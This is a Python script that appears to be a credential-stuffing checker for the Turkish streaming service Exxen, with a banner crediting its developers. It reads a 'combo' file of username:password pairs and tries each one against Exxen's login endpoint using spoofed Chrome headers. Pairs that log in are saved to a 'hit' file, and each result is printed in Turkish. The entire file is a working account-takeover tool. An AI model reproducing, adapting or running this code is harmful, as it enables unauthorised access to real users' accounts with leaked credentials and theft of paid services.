import requests, base64, time
import requests, json, time
from cfonts import render
T, H, Z, Q, X = '\033[1;32m', '\033[1;36m', '\033[1;31m', '\033[1;36m', '\033[1;33m'
exxen_hit_tho = "t5omas_exxen_hit.txt"

#
  #
     #
         #
          # - Dev ~ @dezzevip/ @octpsprime 
          
          
output = render(' DEZZE    EXXEN', colors=['white', 'blue'], align='center')
print("\x1b[1;39m—" * 60)
print(output)
print("\x1b[1;39m—" * 60)

          
def shelby_thomas(username, password):
    thomas_tool = base64.b64encode(f"{username}:{password}".encode()).decode()
    login_url = "https://mw-proxy.app.exxen.com/user/login"
    login_headers = {
        "accept": "application/json,text/plain,*/*", "accept-encoding": "gzip,deflate,br,zstd", "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "authorization": f"Basic {thomas_tool}", "content-type": "application/json", "origin": "https://www.exxen.com", "referer": "https://www.exxen.com/",
        "sec-ch-ua": "\"Google Chrome\";v=\"131\",\"Chromium\";v=\"131\",\"Not_A Brand\";v=\"24\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"",
        "user-agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64)AppleWebKit/537.36(KHTML,like Gecko)Chrome/131.0.0.0Safari/537.36"
    }
    login_payload = {"deviceDetails": {"deviceName": "Chrome", "deviceType": "Desktop", "modelNo": "131.0.0.0", "serialNo": "131.0.0.0", "brand": "Chrome", "os": "Windows", "osVersion": "10"}}
    try:
        response = requests.post(login_url, headers=login_headers, json=login_payload, timeout=10)
        if response.status_code == 200 and response.json().get("bearer", {}).get("auth", {}).get("token"):
            return True
    except requests.exceptions.RequestException as e:
        print(f"ban ..")
        time.sleep(2)
    return False
 
          
def thomas(cumba):
    with open(cumba, "r") as file:
        for line in file:
            username, password = line.strip().split(":")
            if shelby_thomas(username, password):
                with open(exxen_hit_tho, "a") as hit:
                    hit.write(f"{username}:{password}\n")
                print("\x1b[1;39m—" * 60)
                print(f"Giriş başarılı✅: {username}:{password}")
            else:
                
                print(f"Giriş başarısız❌: {username}:{password}")
                print("\x1b[1;39m—" * 60)

cumba = input(" ~ Combo: ")
thomas(cumba)

